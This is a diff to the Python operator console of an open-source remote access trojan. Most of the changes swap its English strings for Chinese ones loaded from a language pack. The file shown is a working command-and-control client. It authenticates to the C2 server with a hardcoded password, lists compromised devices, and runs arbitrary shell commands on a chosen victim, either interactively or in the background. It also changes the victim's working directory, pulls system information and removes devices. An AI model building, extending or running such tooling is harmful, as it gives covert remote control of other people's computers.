@@ -1,4 +1,4 @@
-__author__ = "Zhao Bokai"
+__author__ = "赵博凯"
 __license__ = "GPL v3"
 
 import requests
@@ -9,40 +9,45 @@ import rich.table
 import rich.text
 
 from sys import exit
+import load_lang_pack
 
-# Server configuration
-APT_SITE = "http://localhost:5000"  # Server address
-API_PATH = "fuck"  # API path
-APT_PASSWORD = "fuck"  # Access password
+# 服务器配置
+APT_SITE = "http://localhost:5000"  # 服务器地址
+API_PATH = "fuck"  # API路径
+APT_PASSWORD = "fuck"  # 访问密码
 
-# Logging output class
+# 初始化语言包
+lp = load_lang_pack.LanguagePack("server.json", "zh")
+lp.load()
+
+# 日志输出类
 class Printer:
-    """Custom log printer with color support"""
+    """自定义日志打印器，支持彩色输出"""
     def __init__(self):
         self.console = rich.console.Console()
     
     def log_info(self, message: str):
-        """Print info log"""
+        """打印信息日志"""
         self.console.log(f"[white on blue][*][/white on blue]", message, style="white")
 
     def log_warning(self, message: str):
-        """Print warning log"""
+        """打印警告日志"""
         self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")
 
     def log_error(self, message: str):
-        """Print error log"""
+        """打印错误日志"""
         self.console.log(f"[white on red][-][/white on red]", message, style="bold red")
 
     def log_success(self, message: str):
-        """Print success log"""
+        """打印成功日志"""
         self.console.log(f"[white on green][+][/white on green]", message, style="green")
     
     def log_debug(self, message: str):
-        """Print debug log"""
+        """打印调试日志"""
         self.console.log(f"[grey50][|][/grey50]", message, style="grey50")
 
 def output(*args, type=""):
-    """Unified log output interface"""
+    """统一日志输出接口"""
     printer = Printer()
     if type.strip() == "":
         printer.console.log(*args)
@@ -60,24 +65,24 @@ def output(*args, type=""):
         else:
             raise ValueError(f"Invalid type: {type}")
 
-# Server operations class
+# 服务器操作类
 class Server:
     @staticmethod
     def device_list():
-        """Get and display device list"""
+        """获取并显示设备列表"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                 json={"func_name": "device_list"}, 
                                 cookies=cookie)
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {response.json()}")
         result = response.json()
         if type(result) != list:
             output(result, type="info")
             return
-        Table = rich.table.Table(title="Device List")
-        Table.add_column("Device ID", justify="center", style="cyan")
-        Table.add_column("Device IP", justify="center", style="magenta")
-        Table.add_column("Device Info", justify="center", style="green")
+        Table = rich.table.Table(title=lp.get("device_list_title"))
+        Table.add_column(lp.get("device_id"), justify="center", style="cyan")
+        Table.add_column(lp.get("device_ip"), justify="center", style="magenta")
+        Table.add_column(lp.get("device_info"), justify="center", style="green")
         for i in result:
             Table.add_row(rich.text.Text(i["id"], overflow="fold"), 
                             rich.text.Text(i["ip"], overflow="fold"), 
@@ -86,42 +91,42 @@ class Server:
 
     @staticmethod
     def select_device(id):
-        """Select device to control"""
+        """选择要控制的设备"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                     json={"func_name": "command", "id": id, "command": "echo hello world"}, 
                                     cookies=cookie)
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {response.json()}")
-        output(f"Selected device: {id}", type="success")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {response.json()}")
+        output(f"{lp.get('selected_device')}：{id}", type="success")
         return id
 
     @staticmethod   
     def delete_device(id):
-        """Delete specified device"""
+        """删除指定设备"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                     json={"func_name": "delete", "id": id}, 
                                     cookies=cookie)
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {response.json()}")
-        output(f"Deleted device: {id}", type="success")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {response.json()}")
+        output(f"{lp.get('deleted_device')}：{id}", type="success")
         
     @staticmethod
     def systeminfo(id):
-        """Get device system information"""
+        """获取设备系统信息"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                 json={"func_name": "systeminfo", "id": id}, 
                                 cookies=cookie)
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {response.json()}")
         system_info = json.loads(response.json()["message"])
         with open("systeminfo.json", "w") as f:
             json.dump(system_info, f, indent=4, ensure_ascii=False)
         rich.print_json(data=system_info)
-        output("System information saved to systeminfo.json file", type="success")
+        output(lp.get("system_info_saved"), type="success")
 
     @staticmethod
     def command(id):
-        """Enter device command mode"""
+        """进入设备命令模式"""
         while True:
             command = input(f"(command)<{id}>>")
             if command.strip().lower() == "exit": 
@@ -131,61 +136,52 @@ class Server:
                                      cookies=cookie)
             result = response.json()
             if not response.ok: 
-                raise Exception(f"Request failed: {response.status_code} {result["error"]}")
+                raise Exception(f"{lp.get('request_failed')}：{response.status_code} {result["error"]}")
             result = json.loads(result["message"])
             for i in result.items():
                 output(f"{i[0]}: {i[1]}", type="info")
     
     @staticmethod
     def background(id, command):
-        """Execute command in background on device"""
+        """在设备上后台执行命令"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                 json={"func_name": "background", "id": id, "command": command}, 
                                 cookies=cookie)
         result = response.json()
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
-        if "sent" in result["message"]:
-            output(f"Successfully executed command in background: {command}", type="success")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {result["error"]}")
+        if "已发送" in result["message"]:
+            output(f"{lp.get('command_executed_in_background')}：{command}", type="success")
         else:
-            output(f"Command execution failed: {result["message"]}", type="error")
+            output(f"{lp.get('command_execution_failed')}：{result["message"]}", type="error")
     
     @staticmethod
     def cd(id, directory):
-        """Change device working directory"""
+        """切换设备工作目录"""
         response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                 json={"func_name": "change_directory", "id": id, "directory": directory}, 
                                 cookies=cookie)
         result = response.json()
         if not response.ok: 
-            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
+            raise Exception(f"{lp.get('request_failed')}：{response.status_code} {result["error"]}")
         if "successfully" in result["message"]:
-            output(f"Changed working directory: {directory}", type="success")
+            output(f"{lp.get('directory_changed')}：{directory}", type="success")
         else:
-            output(f"Failed to change working directory: {result["message"]}", type="error")
+            output(f"{lp.get('directory_change_failed')}：{result["message"]}", type="error")
 
 def command_input():
-    """Main command line interaction loop"""
+    """命令行交互主循环"""
     select_device = None
     while True:
         try:
-            # Device control mode
+            # 设备控制模式
             if not select_device is None:
                 command = input(f"(console)<{select_device}>>")
                 command = command.strip()
                 match command:
                     case "": pass
                     case "help": 
-                        output('''Help Information:
-    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
-    [u bold yellow]back[/u bold yellow]: [green]Return to previous level[/green]
-    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
-    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
-    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
-    [u bold yellow]systeminfo[/u bold yellow]: [green]Display device system information[/green]
-    [u bold yellow]command[/u bold yellow]: [green]Enter command mode to execute commands and get results[/green]
-    [u bold yellow]background <command>[/u bold yellow]: [green]Run command in background without returning results[/green]
-    [u bold yellow]cd <dir>[/u bold yellow]: [green]Change working directory[/green]''', type="info")
+                        output(lp.get("console_help_info"), type="info")
                     case "back": 
                         select_device = None
                     case "clear": 
@@ -203,10 +199,10 @@ def command_input():
                     case command if command.startswith("cd "): 
                         Server.cd(select_device, command.split(" ", 1)[1])
                     case _: 
-                        output(f"Unknown command: {command}, type help for help", type="error")
+                        output(f"{lp.get('unknown_command')}：{command}", type="error")
                 continue
 
-            # Server control mode
+            # 服务器控制模式
             command = input("(server)>")
             command = command.strip().lower()
             match command:
@@ -214,22 +210,11 @@ def command_input():
                 case "exit": 
                     exit(0)
                 case "help":
-                    output('''Help Information:
-    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
-    [u bold yellow]about[/u bold yellow]: [green]Show about information[/green]
-    [u bold yellow]exit[/u bold yellow]: [green]Exit program[/green]
-    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
-    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
-    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
-    [u bold yellow]delete <id>[/u bold yellow]: [green]Delete connected device[/green]'''  , type="info")
+                    output(lp.get("server_help_info"), type="info")
                 case "clear": 
                     print("\033c")
                 case "about": 
-                    output('''About:
-Author: Zhao Bokai
-Copyright: Copyright © Zhao Bokai, All Rights Reserved.
-This is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
-Uses MIT license, please comply with the license''', type="info")
+                    output(lp.get("about_info"), type="info")
                 case "list": 
                     Server.device_list()
                 case command if command.startswith("select "): 
@@ -237,33 +222,33 @@ Uses MIT license, please comply with the license''', type="info")
                 case command if command.startswith("delete "): 
                     Server.delete_device(command.split(" ", 1)[1])
                 case _: 
-                    output(f"Unknown command: {command}, type help for help", type="error")
+                    output(f"{lp.get('unknown_command')}：{command}", type="error")
         except Exception as e:
-            output(f"Error occurred: {type(e).__name__}: {e}", type="error")
+            output(f"{lp.get('error_occurred')}: {type(e).__name__}：{e}", type="error")
 
 if __name__ == "__main__":
-    # Program entry point
-    output("Copyright: Copyright © Zhao Bokai, All Rights Reserved.", type="info")
-    output("Program starting", type="info")
-    output("Verifying password", type="info")
+    # 程序入口
+    output(lp.get("copyright"), type="info")
+    output(lp.get("program_starting"), type="info")
+    output(lp.get("verifying_password"), type="info")
     try:
-        # Verify server password
+        # 验证服务器密码
         response = requests.post(f"{APT_SITE}/{API_PATH}/verify", json={"password": APT_PASSWORD})
         if response.status_code == 200:
             cookie = response.json()
-            output(f"Verification successful, cookie: {cookie}", type="success")
+            output(f"{lp.get('verification_successful')}: {cookie}", type="success")
         else:
-            output(f"Verification failed: {response.status_code} {response.json()}", type="error")
+            output(f"{lp.get('verification_failed')}：{response.status_code} {response.json()}", type="error")
             exit(1)
     except Exception as e:
-        output(f"Verification failed: {type(e).__name__}: {e}", type="error")
+        output(f"{lp.get('verification_failed')}: {type(e).__name__}：{e}", type="error")
         exit(1)
 
     try:
-        # Start command line interaction
+        # 启动命令行交互
         command_input()
     except Exception as e:
-        output(f"Error occurred: {type(e).__name__}: {e}", type="error")
+        output(f"{lp.get('error_occurred')}: {type(e).__name__}：{e}", type="error")
     except KeyboardInterrupt:
-        output("User interrupted", type="warning")
+        output(lp.get("user_interrupted"), type="warning")
         exit(1)
